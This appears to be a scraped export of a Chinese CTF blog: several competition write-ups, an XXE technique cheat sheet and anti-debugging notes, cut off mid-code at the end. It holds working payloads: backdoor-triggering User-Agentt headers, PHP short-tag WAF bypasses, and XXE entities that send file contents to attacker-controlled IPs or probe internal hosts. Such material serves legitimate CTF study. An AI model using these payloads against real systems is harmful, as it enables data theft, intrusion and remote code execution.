range(6): r.recvline() r.sendlineafter(&#x27;[&gt;] x: &#x27;,str(my[i][0])) r.sendlineafter(&#x27;[&gt;] y: &#x27;,str(my[i][1])) r.sendlineafter(&#x27;[&gt;] z: &#x27;,str(my[i][2])) print(r.recvline())print(r.recvall()) flag flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125; ​ Reverseredemption_code 所谓的虐心手游，连发的兑换码都这么复杂。 反编译看main()函数，输入字符串key分别经过两次处理： 第一层处理，pre()函数： 先判断输入key长度len(key)==14，再与字符串ss1=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;共同作为server_check_redemption_code()函数参数： server_check_redemption_code()函数的核心部分，通过编写代码测试，功能为返回key中符合字符串ss子串的最大长度，s数组保存逐行判断得到的连续字符状态值，如整个key为ss子串，返回起始下标值k-len(key)+1，否则返回-1。 第二层处理，判断输入key长度len(key)==14，再与字符串ss2=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;共同作为server_check_redemption_code()函数参数。 第一次check，需返回值不等于-1进到第二次check，第二次check需返回值为7输出flag，即key既是ss1子串，又是ss2从下标7开始的子串，即共有子串Ninja Must Die。 flag flag&#123;Ninja Must Die&#125; ​ Web签到 师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。 hint: 2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。 开始在环境里翻了一圈无头绪，放hint后查找此事件才知道这是几天前的事，紧跟时事的出题人。 来龙去脉： 3月28日，攻击者使用PHP的作者Rasmus Lerdorf和Jetbrains开发者Nikita Popov的账号，向git.php.net服务器上的 php-src 存储库推送了两次恶意提交。 经观察，在两个恶意提交中，攻击者在上游发布了一个假装成修正文字输入错误的神秘修改。 攻击者以Rasmus Lerdorf的身份签署的恶意提交（非法）植入远程代码执行后门。 仔细检查一下新增的第370行调用zend_eval_string函数的地方，可以发现，这段代码实际上是为运行被劫持的PHP版本的网站植入了一个后门，以获得轻松的远程代码执行（RCE）。 PHP的开发者表示，如果字符串以zerodium开头，这一行就会从User-Agentt HTTP头内执行PHP代码。 此外，恶意代码中包含了一条注解 “REMOVETHIS: sold to zerodium, mid 2017”。值得注意的是，Zerodium是一家知名的零日漏洞经纪商，而注释的意思是“漏洞在2017年中出售给了zerodium”。对此，Zerodium的CEO Chaouki Bekrar认为攻击者很可能试图出售这个漏洞，但找不到卖家，所以攻击者干脆自己恶搞。 同时参考Linkedin上的一文：Official PHP Git server attacked，照样构造payload，开始没注意到属性是User-Agentt而不是默认的User-Agent，百试不出… payload（加在HTTP头） 列目录：User-Agentt: zerodiumsystem(&#39;ls /&#39;); 读文件：User-Agentt: zerodiumsystem(&#39;cat /flag&#39;); flag flag&#123;cc5dbc99-fd75-41f8-87f6-825c7e08f016&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"红明谷杯数据安全大赛技能场景赛","slug":"match-红明谷杯数据安全大赛技能场景赛","date":"2021-04-02T14:23:48.000Z","updated":"2021-04-02T15:07:15.488Z","comments":true,"path":"2021/04/02/match-红明谷杯数据安全大赛技能场景赛/","link":"","permalink":"https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/","excerpt":"","text":"​ 位于福建省中西部的三明市是一座有着优良革命血脉及红色精神的土地，作为曾经的中央苏区的核心区、中央红军长征的出发地、红旗不倒的革命根据地、伟人革命的重要实践地，这片红土地在数字化的今天，在打击网络犯罪，维护数字空间秩序方面同样褒有红色的先进性。结合数字中国峰会，开创网络安全赛事红色品牌——“红明谷”杯，将“风展红旗如画”延伸至网络安全领域，与全国各界网络精英一同打造网络空间的红色安全保卫基地。 本届大赛将创新通过安全意识赛、技能场景赛、揭榜挑战赛等多种竞赛模式，综合考察社会公众、党政机关、行业单位、科研院校等社会各界的网络安全理论及实践应用水平，促进网络实战，建立红色防线，解决实际问题，立体化提升参赛各方网络空间数字治理能力。 https://www.ichunqiu.com/hmgctf ​ 报了名，因工作日没怎么参加，下午抽空做了两题。 Rank: 80+ Misc签到 一起来参与数据安全知识小竞赛。 答题拿flag。 ​ 歪比歪比 戴夫发送了一些信息给僵尸，但是被我截获到了。看看能从里边发现什么?好像是一个Surprise，你来翻译翻译? 流量包里套着哈夫曼编码题，根据词频解码01串。 正要解出，到时间了。 ​ CryptoezCRT Chinese Remainder Theorem is fantastic 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *import gmpy2from random import shuffleflag = b&quot;flag is here&quot;def shuffle_flag(s): str_list = list(s) shuffle(str_list) return &#x27;&#x27;.join(str_list)nl = []el = []count = 0while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1print(nl)print(el)cl = []flag = shuffle_flag(flag.decode()).encode()for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i]))print(cl) 五组 $n,e$，共私钥 $d$，用LLL算法打。发现 $n$ 都已帮从小到大排好序，一步到位。 由于 d = gmpy2.next_prime(bytes_to_long(flag))，求出 $d$ 后往回遍历拿到flag。 123456789101112131415161718192021#Sagefrom gmpy2 import *n = e = c = M=iroot(int(n[4]),int(2))[0]a = [0]*6a[0] = [M,e[0],e[1],e[2],e[3],e[4]]a[1] = [0,-n[0],0,0,0,0]a[2] = [0,0,-n[1],0,0,0]a[3] = [0,0,0,-n[2],0,0]a[4] = [0,0,0,0,-n[3],0]a[5] = [0,0,0,0,0,-n[4]]Mat = matrix(ZZ,a)Mat_LLL = Mat.LLL()d = abs(Mat_LLL[0][0]) // Mfor k in range(1500): print(bytes.fromhex(hex(d-k)[2:])) ​ Webwrite_shell 万无一失的waf。 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; 简单RCE。 先用 ?action=pwd 得到所在目录，再用 ?action=upload&amp;data=xxx 写PHP代码。 waf()函数过滤了php 和 空格，用短标签和 %09 即可绕过。 ?action=upload&amp;data=&lt;?=`ls%09/`?&gt; 读根目录，发现文件 !whatyouwantggggggg401.php， ?action=upload&amp;data=&lt;?=`tac%09/!whatyou*`?&gt; 读文件，访问sandbox目录查看源码得到flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"XXE","slug":"web-XXE","date":"2021-03-01T10:27:23.000Z","updated":"2022-09-01T16:08:17.797Z","comments":true,"path":"2021/03/01/web-XXE/","link":"","permalink":"https://lazzzaro.github.io/2021/03/01/web-XXE/","excerpt":"","text":"​ XML是一种非常流行的标记语言，用于配置文件。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 XXE（XML External Entity，外部实体），从安全角度理解成 XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。 ​ 基本格式（外部实体）1234567891011121314&lt;!-- 通用实体 --&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;&lt;!-- 参数实体 --&gt;&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd; ​ 注入有回显 常规 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; 文件含特殊字符（参数实体） 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; ​ 无回显 (Blind OOB XXE) 常规 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt; 支持的协议： PHP: file http ftp php compress.zlib compress.bzip2 data glob phar Java: http https ftp file jar netdoc mailto gopher ​ 其他利用 HTTP内网主机探测 利用 file 协议读取作为支点服务器的网络配置文件，看有没有内网，以及网段大概是什么样子，可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件，就有大致的探测方向。 123456789101112131415161718192021222324252627282930313233import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;# &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string): xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot; send_xml(xml)def send_xml(xml): headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125; x = requests.post(&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;, data=xml, headers=headers, timeout=5).text coded_string = x.split(&#x27; &#x27;)[-2] # a little split to get only the base64 encoded value print(coded_string)# print(base64.b64decode(coded_string))for i in range(1, 255): try: i = str(i) ip = &#x27;10.0.0.&#x27; + i string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27; print(string) build_xml(string) except:continue HTTP内网主机端口扫描 找到内网一台主机，想要知道攻击点在哪，还需要进行端口扫描，端口扫描的脚本与主机探测类似，只要把IP地址固定，然后循环遍历端口，当然一般端口是通过响应的时间的长短判断该该端口是否开放的。除了这种方法，我们还能结合 burpsuite 进行端口探测。 RCE 主要是由于配置不当/开发内部应用导致的。如果足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令。 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;/core&gt;&lt;/catalog&gt; ​ 绕过（bypass） 协议（如http） 可以利用实体编码绕过。 双重实体编码 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt; %xml;]&gt;&lt;!--编码内容--&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;&lt;core&gt; &lt;message&gt;&amp;xxe;&lt;/message&gt;&lt;/core&gt; data://协议 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;data://text/plain;base64,YWRtaW4=&quot; &gt;]&gt;&lt;comment&gt;&lt;sender&gt;&amp;xxe;&lt;/sender&gt;&lt;content&gt;111&lt;/content&gt;&lt;/comment&gt; 12345678910&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;&gt; %a; %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;&lt;!--编码内容--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; file://协议+文件上传 12345678&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt;&lt;!--上传文件--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; php://filter协议+文件上传 1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--上传文件--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt; 1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--上传文件--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg== 关键词（如 ENTITY, SYSTEM, file） 使用编码方式绕过：UTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml 12345678910import requestsurl = &#x27;http://url/&#x27;payload = &quot;&quot;&quot;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://yourVPS/evil.dtd&quot;&gt;%remote;%int;%send;]&gt;&quot;&quot;&quot;payload = payload.encode(&#x27;utf-16&#x27;)requests.post(url, data=payload) evil.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://42.192.137.212/index.php?q=%file;&#x27;&gt;&quot;&gt; ​ 参考从几道CTF题学习Blind XXE","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://lazzzaro.github.io/tags/XXE/"}],"author":"Lazzaro"},{"title":"静态反调试","slug":"reverse-静态反调试","date":"2021-02-24T14:23:51.000Z","updated":"2022-08-20T15:42:25.501Z","comments":true,"path":"2021/02/24/reverse-静态反调试/","link":"","permalink":"https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"​ 静态反调试技术只需要在程序运行之前进行一次破解即可解除全部限制，且不需要二次操作。而且静态反调试技术对于操作系统的依赖性非常大，相同的反调试技术在不同的操作系统表现可能不同。 （待补充） 参考： https://xz.aliyun.com/t/5685 https://xz.aliyun.com/t/5732/ https://xz.aliyun.com/t/6133 花指令去花： IDA - 用 U 取消对应代码段的定义,然后在跳转位置出用热键 C 重新定义即可，中间的垃圾代码nop掉。 1234567891011121314151617181920import idautilsdef nop(addr,endaddr): while(addr&lt;endaddr): PatchByte(addr,0x90) addr+=1def undefine(addr,endaddr): while addr&lt;endaddr: MakeUnkn(addr,0) addr+=1def dejunkcode(addr,endaddr): while addr&lt;endaddr: MakeCode(addr) # 匹配模版 if Byte(addr)==0xe8 and Byte(addr+6)==0x12 and Byte(addr+7)==0x83: next=addr+10 nop(addr,next) addr=next continue addr+=ItemSize(addr)dejunkcode(0x00401000,0x00411E40) ​ SMCSMC（自修改代码，Self-Modifying Code），就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。 还原方法 首先确定需要加密的代码部分； 通过vs查看反汇编（或者OD、IDA等）可以确定对应部分的反汇编代码； 将这段代码手工用16进制编辑器覆盖为加密后的数据； 程序执行时则运行事先写好的代码先进行解密再运行。 参考 https://blog.csdn.net/qq_41923479/article/details/80377708https://blog.csdn.net/palmer9/article/details/105034093 脚本 IDA - File - Script file 1234567891011#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x00401216; auto i = 0; for(i=0;i&lt;=0x43E;i++) &#123; PatchByte(addr+i,Byte(addr+i)^Byte(0x00409080+i)); &#125;&#125; ​ MOV混淆​ OLLVM混淆（LLVM） 基于SnowGirls的deflat，利用angr框架实现去除控制流平坦化。 python deflat.py -f check_passwd_x8664_flat --addr 0x400530 LLVM多种格式 xx.c （源代码） xx.ll （LLVM字节码的文本表示） xx.s （机器汇编码表示的汇编文件） xx.bc （LLVM字节码的二进制形式） xx.out （可执行的二进制文件） 常用转换： 12345clang test.bc -o testllvm-dis test.bc -o test.llllvm-as test.ll -o test.bcllc test.bc -o test.slli test.bc ​ TLS反调试ThreadLocalStorage(TLS)，是Windows为解决一个进程中多个线程同时访问全局变量而提供的机制。TLS可以简单地由操作系统代为完成整个互斥过程，也可以由用户自己编写控制信号量的函数。当进程中的线程访问预先制定的内存空间时，操作系统会调用系统默认的或用户自定义的信号量函数，保证数据的完整性与正确性。 而当Coder选择使用自己编写的信号量函数时，在应用程序初始化阶段，系统将要调用一个由用户编写的初始化函数以完成信号量的初始化以及其他的一些初始化工作。此调用必须在程序真正开始执行到入口点之前就完成，以保证程序执行的正确性。 TLS回调函数的执行，与数据的初始化，都在程序入口点之前执行，TLS是整个程序最早运行的地方，所以可以用这个特性，执行一些特殊操作。然后在最后程序退出时还会调用一次。 TLS反调试： 往定义的TLS函数里写代码。 OD调试程序的时候，要先找到程序的入口点，跟拿着钥匙开门一样，找到孔，才能插钥匙。TLS回调函数，由于可以在程序中最早运行的时候执行，可以把在调试器检测到入口点之前，它自己检测是否存在调试。例如，检测加载环境是不是“OllyDbg”等。 解法： 可以通过patch掉TLS回调来反反调试，但既然它用到了isDebuggerPresent，我们也可以通过nop填充来让调试能够继续运行。 ​ SEH如果程序引发了异常，程序将利用Windows的一种异常处理机制 SEH（Structured Exception Handling）机制处理异常，在处理过程中对程序进行一定的修改。常见形式：__try&#123;...&#125; __except(filter)&#123;...&#125;。 由于SEH中的很多代码不会被IDA反编译出来，所以它常常被用来反静态分析：程序员在try块中的某些情况下故意触发一些异常，来执行except块中他们想要隐藏起来的代码。 简而言之，就像它们的名字一样，程序先执行try块中的逻辑，如果try中产生了一些异常的情况（可以简单理解为程序发生了一些意外），就会执行except中的代码来处理异常；反之，如果try块中没有产生异常，except块就不会被执行。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"反调试","slug":"反调试","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"author":"Lazzaro"},{"title":"CTFshow 大吉大利杯DJBCTF","slug":"match-CTFshow-大吉大利杯DJBCTF","date":"2021-01-24T13:28:29.000Z","updated":"2021-04-27T11:54:43.213Z","comments":true,"path":"2021/01/24/match-CTFshow-大吉大利杯DJBCTF/","link":"","permalink":"https://lazzzaro.github.io/2021/01/24/match-CTFshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AFDJBCTF/","excerpt":"","text":"比赛：CTFshow 大吉大利杯简称：大吉杯 DJB平台：https://ctf.show开始：2021/1/23 9:00结束：2021/1/24 22:00规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：新春月饼一份，单项前三定制量子水杯一个5 题目征集：https://shimo.im/docs/YP3tVqPJTxD6jhdt 出题：4 crypto + 1 reverse WEBveryphp 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;config.php&quot;);class qwq&#123; function __wakeup()&#123; die(&quot;Access Denied!&quot;); &#125; static function oao()&#123; show_source(&quot;config.php&quot;); &#125;&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\&#x27;|\\&quot;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;if(isset($shaw_root))&#123; if(preg_match(&#x27;/^\\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\\D*?(abc.*?)p(hp)*\\@R(s|r).$/&#x27;, $shaw_root)&amp;&amp; strlen($shaw_root)===29)&#123; echo $hint; &#125;else&#123; echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;; &#125;&#125;else&#123; echo &quot;&lt;br&gt;&quot;.&quot;Input correct parameters&quot;.&quot;&lt;br&gt;&quot;; die();&#125;if($ans===$SecretNumber)&#123; echo &quot;&lt;br&gt;&quot;.&quot;Congratulations!&quot;.&quot;&lt;br&gt;&quot;; call_user_func($my_ans);&#125; extract($_POST)以POST方式传入变量。（第一个preg_match内的特殊字符完全无过滤作用，过滤的是$str变量。） 第一层，传入$shaw_root（如果上面preg_match过滤正常，则不能使用_，利用PHP特性，当参数名中含+/[/./空格这些字符时会被解析为_，传入shaw[root=1）；接着匹配preg_match内正则表达式，利用 https://regex101.com/ 可试出匹配的字符串，这里使用-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx，得到hint： &gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5 第二层，完全无需理会hint内容，照样利用extract($_POST)以POST方式传入参数ans=1和SecretNumber=1，覆盖原始变量值，再给call_user_func传入my_ans变量执行自定义函数，结合给出的类静态方法，传my_ans=qwq:oao得flag。 payload: shaw_root=-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx&amp;ans=1&amp;SecretNumber=1&amp;my_ans=qwq::oao ​ spaceman 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);highlight_file(__FILE__);class spaceman&#123; public $username; public $password; public function __construct($username,$password) &#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;ctfshowvip&#x27;) &#123; include(&quot;flag.php&quot;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;ctfshowup&#x27;,&#x27;ctfshow&#x27;,$string);&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\_|\\.|\\]|\\[/is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;$ser = filter(serialize(new spaceman($user_name,$pass_word)));$test = unserialize($ser);?&gt; 应该是出题失误，本想考反序列化字符逃逸，结果变成很简单的非预期。 同样，extract($_POST)以POST方式传入变量。（第一个preg_match内的特殊字符完全无过滤作用，过滤的是$str变量。） 传入user_name=1&amp;pass_word=ctfshowvip即得flag。 ​ MISC十八般兵器 刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙 hint1: JPHS hint2: 用Notepad++打开试试？ hint3: 前十种兵器对应10进制，后八种对应8进制 18张图，根据hint1，用jphs05隐写工具分别从18张图分别提取出txt文件（空密码）， 再根据hint2分别把每个txt文件最后一行的数字都摘出，前十个连接后十进制转字符串，后八个连接后八进制转字符串，字符串连接起来为flag。 ​ 请问大吉杯的签到是在这里签吗 flag为全部小写字母，没有空格 一张二维码，按照扫码内容能分离出提取出4张二维码，内容有提示意义， 第2张图的内容为还要往前走......是不是在这个路口转弯呢？，有问题，上stegsolve查看，在Random colour map就能看出端倪： 猪圈密码对照解密得flag。 ​ 牛年大吉 题目下载 蓝奏云下载地址：https://wws.lanzous.com/i1Ac0jybrvc 百度云下载地址： https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ 提取码：ns2k hint1: 不要格式化哟，看看引导扇区是不是丢东西了 hint2: 压缩包密码在图片文件头里 vhd磁盘文件，用DiskGenius装载，修复磁盘，能提取出!lag.7z和牛年大吉.png两个文件，根据hint2，7z压缩包密码为png文件头89504E47，解压得flag。 ​ 拼图v2.0 有手就行，没手的可以拿眼睛去瞪 打开环境，带旋转的拼图，gaps不方便，纯手工上。 ​ AA86 在一台旧电脑上（大约在16位操作系统还能跑的年代）发现了这个文件，挖掘它的秘密 hint: 请仔细阅读题目描述(5毛一条，去掉括号) 根据提示关键是16位操作系统。 Google搜索DOS AA86，在第2条结果可发现AA86文件编码说明： Aa86 is a .COM file encoder by Yosuke Hasegawa that encodes binaries using only symbols characters, with a decoder. 把文件加上后缀.COM，找个MSDOS在虚拟机安装，再运行AA86.COM得flag。 ​ CRYPTOeasysignin 1234567891011121314151617181920212223242526272829from Crypto.Util.number import getPrime, isPrime, bytes_to_longfrom random import getrandbitsfrom secret import flagdef genpq(k): while True: p = getPrime((k + 3) // 4) q = getPrime((k + 3) // 4) if ((p ** 2) * (q ** 2)).bit_length() == k: return (p, q)def genseq(t, k): x = getrandbits(k) y = getrandbits(k) r = [] r += [pow(x * getrandbits(k)+y, pow(getrandbits(k), t - 